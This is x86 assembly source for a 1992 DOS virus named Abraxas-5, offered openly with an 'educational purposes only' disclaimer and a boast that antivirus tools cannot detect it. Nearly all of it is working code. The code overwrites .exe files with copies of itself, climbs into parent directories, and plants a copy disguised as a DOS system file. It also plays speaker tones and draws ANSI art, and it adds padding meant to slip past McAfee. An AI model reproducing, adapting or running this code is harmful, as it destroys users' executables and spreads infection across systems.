   ;*********************************************************
   ; ÖÄÄ¿ ÒÄ¿  ÒÄÄ¿ ÖÄÄ¿ Ä· Ú ÖÄÄ¿  ÖÄ¿     ÖÄÄÄ            *
   ; ÇÄÄ´ ÇÄÁ¿ ÇÄÂÙ ÇÄÄ´ ÖÐÂÙ ÇÄÄ´  ÓÄ¿ ÄÄÄ ÓÄÄ¿            *
   ; Ð  Á ÐÄÄÙ Ð Á  Ð  Á ½ ÀÄ Ð  Á ÓÄÄÙ     ÄÄÄÙ            *
   ; ÖÄÄ¿ ÖÄÄ¿ ÖÄÒÄ¿  ³ ÒÄÄ¿ Ä· Ú ÒÄÄ¿     Ò  Â Ä· Ú        *
   ; º    º  ³ º º ³ ÚÙ ÇÄ   ÖÐÂÙ ÇÄ       Ó·ÚÙ ÖÐÂÙ        *
   ; ÓÄÄÙ ÓÄÄÙ Ð Ð Á ³  ÐÄÄÙ ½ ÀÄ ÐÄÄÙ      ÓÙ  ½ ÀÄ o o o  *
   ;                                      ->> pAgE <<-      *
   ;*********************************************************
   ;
   ; This is how to professionally hack several programs into
   ; a very effective virus. As with any of my viruses, it has
   ; been put together ONLY for educational purposes and is not
   ; to be used otherwise. Feel free to compile it and run it
   ; on your machine. For a HACK, It is really good...
   ; As of 12/10/92, it is undetectable by McAfee, F-prot,
   ; TBscan, Dr. Solomon's AV Tool Kit, and Virex.
   ; Remember! This file is for EDUCATIONAL PURPOSES ONLY !!!
   ;
   code    segment 'CODE'
   assume cs:code,ds:code,es:code,ss:code

   org     0100h

   code_length     equ     heap-start     ; This is CREDIT to the programmers
   ; whose routines I used for Abraxas-5.
   START:          CALL    MAIN           ; Hacked off of VCL Yankee Routine
   ONE:            CALL    INFECT_FILE    ; Hacked off of the OW Viruses
   TWO:            CALL    FIND_NEXT      ; Hacked off the PS-MPC
   TWO_AND_A_HALF: CALL    INFECT_FILE    ; Back to the OW hacks
   THREE:          CALL    SNEAK          ; Well, this one's mine. :)
   THATS_ALL:      CALL    ABRAXAS        ; Hacked off of TheDraw 4.51

   ;************************************
   ;************************************
   ;    Make Some Noises  VCL - Pieces
   ;************************************
   ;************************************

   main            proc    near
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop
   nop ;
   mov     si,offset data00
   get_note:       mov     bx,[si]
   or      bx,bx
   je      play_tune_done

   mov     ax,034DDh
   mov     dx,0012h
   cmp     dx,bx
   jnb     new_note
   div     bx
   mov     bx,ax
   in      al,061h
   test    al,3
   jne     skip_an_or
   or      al,3
   out     061h,al
   mov     al,0B6h
   out     043h,al
   skip_an_or:     mov     al,bl
   out     042h,al
   mov     al,bh
   out     042h,al

   mov     bx,[si + 2]
   xor     ah,ah
   int     1Ah
   add     bx,dx
   wait_loop:      int     1Ah
   cmp     dx,bx
   jne     wait_loop
   in      al,061h
   and     al,0FCh
   out     061h,al

   new_note:       add     si,4
   jmp     short get_note
   play_tune_done:
   endp            main
   ret

   ;***************************
   ;***************************
   ;This is a section that was
   ;borrowed from the OW Virus
   ;***************************
   ;***************************

   infect_file     proc    near

   Mov cx,2h
   Mov Ah,4eh                ; DOS Find First
   Lea Dx,com_Spec           ; Name of file we want
   Nop                       ; McAfee Break Point
   Int 21h                   ; Thanks Apache Warrior!
   Mov Ah,3ch                ; Create it...
   xor cx,cx
   Mov Dx,9eh                ; Where the file is
   Int 21h
   Mov Bh,40h                ; Write to file. Why BH..
   Xchg Ax,Bx                ; I dunno... AH, didn't like it.
   Lea Dx,start              ; Where to Start
   Mov CX,code_length        ; How much to write
   Int 21h
   endp            infect_file
   ret

   find_next       proc    near
   mov  ah,3bh
   lea  dx,dot_dot
   int  21h
   endp    find_next
   RET

   buffer          dw      ?

   ;*********************************
   ;*********************************
   ; This Is My Section Here Too
   ;*********************************
   ;*********************************

   sneak           proc near
   pushf                  ; Save the registers.
   push ax                ; Why? I dunno...
   push bx                ; It seemed to make it
   push cx                ; work smoother.
   push dx
   push si
   push di

   mov  dx,offset file1_name   ; Name of the file
   xor  cx,cx                  ; create into DX
   mov  ax,3c02h               ; DOS Create function
   int  21h                    ; with 002h for Attbs.
   xchg ax,bx
   mov  ah,40h
   mov  cx,code_length         ; How big we are.
   mov  dx,offset start        ; Where to start writing
   int  21h

   mov  ah,3eh                 ; Close it up.
   int  21h

   pop  di                     ; Here we are at this
   pop  si                     ; register thing again.
   pop  dx                     ; I don't know what
   pop  cx                     ; I am doing here, either!
   pop  bx
   pop  ax
   popf
   endp            sneak
   ret
   ;**********************************************
   ;**********************************************
   com_spec        db      "*.exe",0
   file1_name      db      "c:dosdosshell.com",0
   dot_dot         db      "..",0
   copyright       db      "MS-DOS (c)1992",0
   who_am_i        db      "->>ABRAXAS-5<<--",0
   ;**********************************************
   ;**********************************************
   ; This Piece Came From TheDraw 4.51
   ;**********************************************
   ;**********************************************

   abraxas         proc    near
   start_abx:
   jmp short loc_1
   db  90h
   data_2      db  0
   data_1e     equ 0A0h
   data_3      dw  1DDh
   db  2
   data_4      dw  0
   db      '...For he is not of this day'
   db  1Ah
   data_5          db      '...Nor he of this mind', 0Dh, 0Ah
   db  '$'
   loc_1:
   mov ah,0Fh
   int     10h


   mov bx,0B800h
   cmp al,2
   je      loc_2
   cmp al,3
   je      loc_2
   mov data_2,0
   mov bx,0B000h
   cmp al,7
   je      loc_2
   mov     dx,offset data_5
   mov ah,9
   int     21h

   retn
   loc_2:
   mov es,bx
   mov di,data_4
   mov si,offset data_6
   mov dx,3DAh
   mov bl,9
   mov cx,data_3
   cld
   xor     ax,ax

   locloop_4:
   lodsb
   cmp al,1Bh
   jne     loc_5
   xor ah,80h
   jmp short loc_20
   loc_5:
   cmp al,10h
   jae     loc_8
   and ah,0F0h
   or  ah,al
   jmp short loc_20
   loc_8:
   cmp al,18h
   je      loc_11
   jnc     loc_12
   sub al,10h
   add al,al
   add al,al
   add al,al
   add al,al
   and ah,8Fh
   or  ah,al
   jmp short loc_20
   loc_11:
   mov di,data_4
   add di,data_1e
   mov data_4,di
   jmp short loc_20
   loc_12:
   mov bp,cx
   mov cx,1
   cmp al,19h
   jne     loc_13
   lodsb
   mov cl,al
   mov     al,20h
   dec bp
   jmp short loc_14
   loc_13:
   cmp al,1Ah
   jne     loc_15
   lodsb
   dec bp
   mov cl,al
   lodsb
   dec bp
   loc_14:
   inc cx
   loc_15:
   cmp data_2,0
   je      loc_18
   mov bh,al

   locloop_16:
   in      al,dx
   rcr     al,1
   jc      locloop_16
   loc_17:
   in      al,dx
   and al,bl
   jnz     loc_17
   mov al,bh
   stosw
   loop    locloop_16

   jmp short loc_19
   loc_18:
   rep     stosw
   loc_19:
   mov cx,bp
   loc_20:
   jcxz    loc_ret_21
   loop    locloop_4
   loc_ret_21:
   retn
   data_6      db  9
   db   10h, 19h, 4Fh, 18h, 19h, 4Fh
   db   18h, 19h, 4Fh, 18h, 19h, 4Fh
   db   18h, 19h, 4Fh, 18h, 19h, 4Fh
   db   18h, 19h, 4Fh, 18h, 19h, 02h
   db   04h, 1Ah, 49h,0DCh, 19h, 02h
   db   18h, 19h, 02h,0DBh, 19h, 47h
   db  0DBh, 19h, 02h, 18h, 19h, 02h
   db  0DBh, 19h, 02h, 08h,0DFh, 04h
   db   1Ah, 04h,0DFh, 19h, 02h, 08h
   db  0DFh, 04h, 1Ah, 05h,0DFh, 19h
   db   02h, 08h,0DFh, 04h, 1Ah, 05h
   db  0DFh, 19h, 03h, 08h,0DFh, 04h
   db   1Ah, 04h,0DFh, 19h, 02h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h,0DFh,0DFh, 19h
   db   02h, 08h,0DFh, 04h, 1Ah, 04h
   db  0DFh, 19h, 03h, 08h,0DFh, 04h
   db   1Ah, 04h,0DFh, 19h, 02h,0DBh
   db   19h, 02h, 18h, 19h, 02h,0DBh
   db   20h, 20h, 08h,0DFh, 04h,0DFh
   db  0DFh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 20h, 20h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h,0DFh,0DFh, 20h
   db   20h, 08h,0DFh, 04h,0DFh,0DFh
   db   20h, 20h, 08h,0DFh, 04h,0DFh
   db  0DFh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 19h, 02h, 08h,0DFh
   db   04h,0DFh,0DFh, 08h,0DFh, 04h
   db  0DFh,0DFh, 19h, 02h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h,0DFh,0DFh, 19h
   db   06h,0DBh, 19h, 02h, 18h, 19h
   db   02h,0DBh, 20h, 20h, 08h,0DFh
   db   04h, 1Ah, 06h,0DFh, 20h, 20h
   db   08h,0DFh, 04h, 1Ah, 05h,0DFh
   db   19h, 02h, 08h,0DFh, 04h, 1Ah
   db   05h,0DFh, 19h, 02h, 08h,0DFh
   db   04h, 1Ah, 06h,0DFh, 19h, 03h
   db   08h,0DFh, 04h,0DFh,0DFh,0DFh
   db   19h, 03h, 08h,0DFh, 04h, 1Ah
   db   06h,0DFh, 19h, 02h, 08h,0DFh
   db   04h, 1Ah, 04h,0DFh, 19h, 02h
   db  0DBh, 19h, 02h, 18h, 19h, 02h
   db  0DBh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 20h, 20h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h,0DFh,0DFh, 20h
   db   20h, 08h,0DFh, 04h,0DFh,0DFh
   db   20h, 08h,0DFh, 04h,0DFh,0DFh
   db   19h, 02h, 08h,0DFh, 04h,0DFh
   db  0DFh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 19h, 02h, 08h,0DFh
   db   04h,0DFh,0DFh, 08h,0DFh, 04h
   db  0DFh,0DFh, 19h, 02h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 19h, 06h
   db   08h,0DFh, 04h,0DFh,0DFh, 20h
   db   20h,0DBh, 19h, 02h, 18h, 19h
   db   02h,0DBh, 20h, 20h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h, 1Ah, 05h,0DFh
   db   19h, 02h, 08h,0DFh, 04h,0DFh
   db  0DFh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 20h, 20h, 08h,0DFh
   db   04h,0DFh,0DFh, 20h, 20h, 08h
   db  0DFh, 04h,0DFh,0DFh, 20h, 20h
   db   08h,0DFh, 04h,0DFh,0DFh, 20h
   db   20h, 08h,0DFh, 04h,0DFh,0DFh
   db   20h, 20h, 08h,0DFh, 04h,0DFh
   db  0DFh, 20h, 20h, 08h,0DFh, 04h
   db  0DFh,0DFh, 20h, 20h, 08h,0DFh
   db   04h, 1Ah, 05h,0DFh, 19h, 02h
   db  0DBh, 19h, 02h, 18h, 19h, 02h
   db  0DBh, 1Ah, 47h,0DCh,0DBh, 19h
   db   02h, 18h

   endp            abraxas
   ret
   int     20h

   data00    dw      100,2,200,2,300,2,400,2
   dw      700,2,800,2,900,2,1000,2,1100,2
   dw      1200,2,1300,2,1400,2,1500,2
   dw      1600,2,1700,2,1800,2,1900,2,2000,2
   dw      2100,2,2200,2,2300,2,2400,2
   dw      2500,2,2600,2,2700,2,2800,2,2900,2
   dw      3000,2,3100,2,3200,2,3300,2
   dw      3400,2,3500,2,3600,2,3700,2,3800,2
   dw      3900,2,4000,2,4100,2,4200,2
   dw      4300,2,4400,2,4500,2,4600,2,4700,2
   dw      4800,2,4900,2,5000,2,5100,2
   dw      5200,2,5300,2,5400,2,5500,2,5600,2
   dw      0
   heap            label  near
   code            ends
   end    START
